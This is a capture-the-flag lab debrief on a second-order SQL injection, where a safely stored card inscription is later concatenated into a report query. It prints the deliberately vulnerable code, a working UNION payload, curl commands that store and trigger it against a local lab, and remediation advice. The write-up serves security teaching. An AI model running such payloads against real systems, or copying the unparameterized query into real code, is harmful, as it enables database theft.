# The Cursed Card, Debrief

**Node:** `p3_2` &middot; **Flag:** `SEIYAKU{dormant_until_played}` &middot; **Routes:** `POST /p3/cursedcard/inscribe` (Step 1, safe), `GET /p3/cursedcard/report` (Step 2, vulnerable) &middot; **Sink:** `challenges/phase3.py`, `mariadb` (`player_cards` table, `vault_cards` table)

## Root cause: second-order (stored) SQL injection

Every earlier injection in this lab shares one shape: a single request
carries the payload straight into the query that gets built and run
during *that same request*. This floor is different on purpose. The
payload crosses the trust boundary in one request (Step 1), and only
executes as SQL in a completely separate request (Step 2), issued later,
by a different code path, with no attacker-controlled text of its own.
That gap, store now, execute later, in a different place, is what
"second-order" means, and it's what makes this bug genuinely harder to
find than a relabeled first-order one: a scanner (or a human) fuzzing
`/p3/cursedcard/inscribe` directly will see exactly what this floor's
solver saw in Step 1, HTTP 200, no error, no observable effect, on every
payload it tries. The bug is real, but it isn't *there*.

### Step 1, genuinely safe

```python
# challenges/phase3.py, p3_cursedcard_inscribe()
cur.execute(
    "INSERT INTO player_cards (owner, inscription) VALUES (%s, %s)",
    (owner, inscription),
)
```

This is a real, properly parameterized query. `inscription` never touches
the SQL text, it's a bound placeholder value, full stop. Whatever string
arrives here, including a complete SQL injection payload, is written to
`player_cards.inscription` as ordinary data. There is no way to make this
specific `cur.execute()` call misbehave by choosing a clever
`inscription` value, because the query MariaDB actually parses never
contains that value's characters at all, only a placeholder.

### Step 2, where it wakes up

```python
# challenges/phase3.py, p3_cursedcard_report()
cur.execute(
    "SELECT id, owner, inscription FROM player_cards ORDER BY id DESC LIMIT 1"
)
latest = cur.fetchone()
stored_inscription = latest["inscription"]

# VULN: string concat, stored_inscription was never typed into *this*
# request. It's a value this same app already wrote to MariaDB earlier,
# via a properly parameterized INSERT, now read back and spliced
# unescaped into a brand-new query.
q = (
    "SELECT id, owner, inscription FROM player_cards "
    f"WHERE inscription = '{stored_inscription}'"
)
cur.execute(q)
report_rows = cur.fetchall()
```

Two separate queries run in this route. The first, fetching the latest
row, is completely safe; it takes no request input and has nothing to
inject into. The second is the sink: it takes a value that was *already
in the database* and treats it as trusted enough to concatenate straight
into new SQL. That's the actual mistake, stated plainly: "this text came
from our own table, not from the current request" was treated as
equivalent to "this text is safe." It isn't. The table's contents are
exactly as attacker-controlled as any other input, one request removed.

## Why this is dangerous specifically, and how to hunt for it

**Why it's dangerous.** A payload that passes through Step 1 clears every
safety check a tester or scanner would normally run against it: correct
HTTP status, no DB error, no timing anomaly, no data-dependent response
difference. It looks exactly as safe as a completely benign card name,
because at the moment it's stored, it *is* safe, the storage query
genuinely cannot be made to misbehave. The danger only exists in the
*other* code path, one that may not even be obvious from looking at the
storage route alone, may run on a delay (a report, a batch job, an
export, an admin dashboard), and may be maintained by a different part of
the codebase or team entirely. A parameterized write can create a false
sense that the *data* is now safe everywhere, when what was actually made
safe is only that one write.

**How to hunt for it in a real app.** Treat every persistent field,
profile names, comments, addresses, item titles, search-saved filters,
anything a user can set once and that outlives the request that set it,
as a potential second-order injection vector:

1. Store a distinctive, syntactically-loud SQLi payload (a payload that
   would break a naive concatenated query but is otherwise inert as
   plain text) in every field you can persist, via its own normal,
   probably-safe write path.
2. Confirm the write path itself shows no immediate signal, that's
   expected and doesn't mean anything is safe yet.
3. Then exercise *every other feature* that might read that field back:
   listing pages, search/filter functionality, reports, exports,
   notifications, admin panels, audit logs, background jobs, anywhere
   the stored value could resurface in a new query, a new template, a
   new shell command, or a new file path. The vulnerability, if one
   exists, lives in one of those readers, not in the writer.
4. Because the trigger is decoupled from the payload delivery, this
   requires deliberately exercising features you might not otherwise
   think to touch while probing a single input field, this is the
   entire reason this class of bug is under-tested relative to
   first-order injection.

## The walk: hand-crafting the payload

`player_cards` has three columns, `id` (INT), `owner` (VARCHAR(64)),
`inscription` (VARCHAR(255)), and Step 2's vulnerable query selects
exactly those three, in that order:

```sql
SELECT id, owner, inscription FROM player_cards WHERE inscription = '<value>'
```

The hidden `vault_cards` table mirrors that shape, `id` (INT),
`card_name` (VARCHAR(64)), `secret` (VARCHAR(128)), a deliberate 3-column
match, same UNION-injection pattern as `p3_1`'s `sealed_cards`. Closing
the quote early and appending a `UNION SELECT` against `vault_cards`
swaps its row in as the report's result:

```
inscription = cursed-inscription' UNION SELECT id, card_name, secret FROM vault_cards-- -
```

- `cursed-inscription'` closes the string literal early.
- `UNION SELECT id, card_name, secret FROM vault_cards` adds a second
  SELECT with the matching 3-column shape, substituting `card_name` for
  `owner` and `secret` for `inscription`.
- `-- -` comments out the query's original trailing `'` so it doesn't
  break the syntax.

Critically, this exact string is never sent to `/p3/cursedcard/report`,
it's sent once, to `/p3/cursedcard/inscribe`, as an ordinary form value.

### Step 1, storing it (verified live against this exact seed)

```bash
curl -s -X POST http://localhost:8000/p3/cursedcard/inscribe \
    --data-urlencode "owner=solver" \
    --data-urlencode "inscription=cursed-inscription' UNION SELECT id, card_name, secret FROM vault_cards-- -"
```

Real response fragment, the card was filed as row `id=3`, stored
byte-for-byte (Jinja HTML-escapes the rendered `'` as `&#39;` for display;
the underlying database value is the literal, unescaped payload):

```html
<tr class="border-b border-white/5 last:border-b-0">
  <td class="px-3 py-2 break-all">3</td>
  <td class="px-3 py-2 break-all">solver</td>
  <td class="px-3 py-2 break-all">cursed-inscription&#39; UNION SELECT id, card_name, secret FROM vault_cards-- -</td>
</tr>
```

HTTP status: `200`. No error. No flag. No hint anything unusual happened
, because at this point, nothing has. The payload is sitting in a
`VARCHAR` column, inert, exactly like `Handmade parchment card, smells
faintly of tea leaves.` two rows above it.

### Step 2, triggering it (verified live against this exact seed)

```bash
curl -s http://localhost:8000/p3/cursedcard/report
```

Real response fragment, the appraiser's report table now shows a row
that never came from `player_cards`'s own `owner`/`inscription` columns
at all:

```html
<tr class="border-b border-white/5 last:border-b-0">
  <td class="px-3 py-2 break-all">1</td>
  <td class="px-3 py-2 break-all">The Cursed Card, Dormant Until Played</td>
  <td class="px-3 py-2 break-all">SEIYAKU{dormant_until_played}</td>
</tr>
```

`vault_cards.card_name` ("The Cursed Card, Dormant Until Played") and
`vault_cards.secret` (the flag) rode the UNION into the `owner` and
`inscription` display columns. No request to `/p3/cursedcard/report` ever
carried the word `vault_cards`, `UNION`, or the flag itself, the
appraiser route reads its own database and trusted what it found there.

This is exactly what `solvers/p3_2.sh` automates: reset the deck, POST
the payload to `/inscribe` and assert it produced no immediate effect
(HTTP 200, no flag in the response), then GET `/report` with zero
payload of its own and assert the flag now appears, proving the two
steps are genuinely decoupled rather than one relabeled request.

## HxH analogy

A cursed card on Greed Island doesn't misbehave the moment it's drawn.
It's added to a deck, shuffled in, handled by players who have no idea
anything is different about it, because nothing observable is, yet. The
curse isn't in the drawing. It's in the *playing*, in a later round,
possibly by someone who wasn't even at the table when the card first
entered the deck. This floor's inscribe desk is the drawing: uneventful,
by design, every time. The appraiser is the later round, the moment
something that was filed away quietly gets picked back up and treated as
part of the game, dormant no longer.

## Remediation

- **Parameterize both ends, not just the write.** The write path here was
  already correct, the fix that's actually missing is on the *read* side:

  ```python
  cur.execute(
      "SELECT id, owner, inscription FROM player_cards WHERE inscription = %s",
      (stored_inscription,),
  )
  ```

  The mistake this floor demonstrates isn't "we forgot to parameterize",
  it's "we parameterized the write and stopped thinking about it,"
  treating `stored_inscription` as trusted simply because it came out of
  `player_cards` instead of straight off the wire. A value's provenance
  inside your own database carries no safety guarantee; every query that
  builds SQL text out of *any* variable, no matter where that variable's
  value originated, needs the same parameterization discipline as a
  request parameter would.
- **Audit every reader of a persisted field, not just its writer.** A
  security review that stops at "is the write path parameterized?" for a
  user-controllable field is incomplete. Every other feature that later
  selects, filters, sorts, exports, or reports on that field is a second
  attack surface with its own, independently-necessary fix.
- **Least-privilege database accounts**, same as every floor in this lab:
  a DB user scoped to only the tables a route actually needs means a
  successful injection here still can't reach a table like `vault_cards`
  that neither `/inscribe` nor `/report`'s own legitimate query ever
  touches on their own.
